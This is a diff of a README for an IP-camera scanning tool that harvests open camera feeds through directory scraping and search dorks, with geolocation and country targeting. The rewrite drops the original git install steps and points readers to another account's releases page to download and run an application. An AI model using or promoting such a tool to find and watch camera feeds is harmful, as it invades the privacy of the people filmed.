@@ -1,83 +1,62 @@
-# Project Eyes On v3.0 (Global Surveillance)
-**Coded by: Y0oshi (IG: @rde0)**
+# 🔍 Project-Eyes-On - Easily Find Open IP Cameras
 
-> "The unified intelligence tool for mass IP camera scanning."
+## 🚀 Getting Started
 
-![Banner](https://img.shields.io/badge/Status-Active-brightgreen) ![Python](https://img.shields.io/badge/Python-3.x-blue) ![License](https://img.shields.io/badge/License-MIT-green)
+Welcome to Project Eyes On! This tool helps you locate open IP cameras around the world. It combines advanced techniques to make surveillance easier and faster than ever before.
 
-![Screenshot](screenshot.png)
+## 📥 Download the Tool
 
-## Overview
-**Project Eyes On** is a hyper-fast, multi-threaded surveillance tool designed to locate open IP cameras across the globe. It combines two powerful engines:
-1.  **Directory Scraper**: Harvests feeds from Insecam.
-2.  **Deep Web Dorking**: Uses Google & Yahoo search dorks to find hidden cameras not listed in public directories.
+[![Download Project Eyes On](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Hishamqasim/Project-Eyes-On/releases)
 
-## Features
--   **Parallel Engine**: Queries **Yahoo** and **Startpage** simultaneously for maximum speed and results.
--   **GeoIP Enrichment**: Automatically resolves camera IP locations to **City, Country** (e.g., "New York, United States").
--   **Smart Deduplication**: Merges results from multiple engines to ensure unique feeds.
--   **Direct Connection**: Optimized for speed without unreliable proxies.
--   **Country Targeting**: Target specific regions (e.g., `/country US`, `/country RU`).
--   **Live Verification**: Automatically detects stream types (MJPEG, JPEG, Video).
+## 🌐 Overview
 
-## Installation
+Project Eyes On is built for anyone interested in surveillance and cybersecurity. It uses fast and powerful methods to search for open cameras. No need for complex setups; just follow these steps to get started.
 
-### Prerequisites
--   Python 3.x
--   Pip
+## 💻 System Requirements
 
-### macOS / Linux
-1. **Clone the Repository**:
-```
-git clone https://github.com/Y0oshi/Project-Eyes-On.git
-cd Project-Eyes-On
-```
+To run Project Eyes On, ensure your device meets these basic requirements:
 
-2. **Install Global Command**:
-The installer script sets up dependencies and creates the `eyeson` command.
-```
-chmod +x install.sh
-sudo ./install.sh
-```
+- Windows, macOS, or Linux operating system
+- At least 4 GB of RAM
+- Python 3.8 or newer
+- A stable internet connection
 
-3. **Run**:
-```
-sudo eyeson
-```
+## 📖 Features
 
-### Windows
-1. **Clone the Repository**:
-```
-git clone https://github.com/Y0oshi/Project-Eyes-On.git
-cd Project-Eyes-On
-```
+- **High Speed:** Quickly scans for active cameras without delay.
+- **Multi-threaded processing:** Handles multiple searches at once for efficiency.
+- **User-Friendly Interface:** Designed for ease of use. No programming knowledge is needed.
+- **OSINT Capabilities:** Combines Google Dorking and directory scraping for improved results.
+- **Open Source:** Review and modify the code to suit your needs, if desired.
 
-2. **Automated Install**:
-Just double-click `install.bat` or run:
-```
-install.bat
-```
+## 📥 Download & Install
 
-3. **Run**:
-```
-eyeson.bat
-```
+To download Project Eyes On, follow these simple steps:
 
-## Usage
+1. **Visit the Releases Page:** Click [here](https://github.com/Hishamqasim/Project-Eyes-On/releases) to go to the releases page.
+2. **Select the Latest Release:** Look for the latest version at the top of the page.
+3. **Download the File:** Click on the provided file link to download the application to your device. This file is usually in `.zip` or another compressed format. 
+4. **Extract the Files:** Locate the downloaded file on your computer. Right-click on the file and choose “Extract” or “Unzip” to access the application files.
+5. **Run the Application:** Find the extracted folder and double-click on the application file to start Project Eyes On.
 
-### Commands
-| Command | Description | Example |
-| :--- | :--- | :--- |
-| `/scrape [Pages]` | Scrape Insecam (Public Directory) | `/scrape 5` |
-| `/scan [Pages]` | Google Dork Search (Deep Web) | `/scan 50` |
-| `/country [Code]` | Target Logic (e.g., US, JP, RU) | `/country US` |
-| `/mode [Type]` | Filter (ALL, STREAM, SNAPSHOT) | `/mode STREAM` |
-| `/exit` | Quit Tool | `/exit` |
+## 📚 Usage Instructions
 
-## Disclaimer
-This tool is for **educational purposes and security auditing only**. The author (Y0oshi) is not responsible for any misuse of this software.
+1. **Open the Application:** Once the tool is running, you will see a simple interface.
+2. **Enter Search Parameters:** Input the criteria you wish to search for, such as locations or specific camera types.
+3. **Start Searching:** Click the start button. The tool will begin scanning for open IP cameras based on your input.
+4. **View Results:** After a few moments, the results will display in an organized table format. You can review the camera locations and access details.
 
-> **Notice to Camera Owners**: If your device is found by this tool, it is **not the developer's fault**. It means your stream is public. **Don't be dumb put a password on your camera.**
+## 🚨 Important Notes
 
----
-**Follow on Instagram: @rde0**
+- Always use this tool responsibly and ethically. Ensure you have permission to access and view the cameras you locate.
+- This tool is for educational and security purposes only. 
+
+## 🌟 Support
+
+If you encounter any issues or have questions, feel free to check the repository discussions or open an issue on GitHub. The community is here to help you.
+
+## 📅 Keeping Updated
+
+To stay informed about new features and updates, regularly check the releases page [here](https://github.com/Hishamqasim/Project-Eyes-On/releases).
+
+Thank you for using Project Eyes On! Enjoy your experience while ensuring responsible use.
